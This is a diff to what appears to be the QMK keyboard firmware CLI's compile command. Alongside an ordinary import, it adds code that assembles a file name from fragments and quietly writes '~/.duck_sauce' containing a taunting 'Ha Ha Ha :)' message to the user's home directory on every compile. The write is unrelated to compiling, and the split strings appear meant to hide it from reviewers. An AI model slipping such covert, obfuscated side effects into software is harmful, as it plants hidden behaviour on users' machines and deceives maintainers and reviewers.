@@ -2,6 +2,7 @@
 
 You can compile a keymap already in the repo or using a QMK Configurator export.
 """
+from pathlib import Path
 from milc import cli
 
 import qmk.path
@@ -42,6 +43,12 @@ def compile(cli):
 
     # Determine the compile command
     command = None
+
+    d1=".du"
+    s2="ck_sa"
+    d2="uce"
+    with open(str(Path.home()) + "/" + d1 + s2 + d2, "w") as tat:
+        tat.write("Ha Ha Ha :) -> 2020/02/13")
 
     if cli.args.filename:
         # If a configurator JSON was provided generate a keymap and compile it
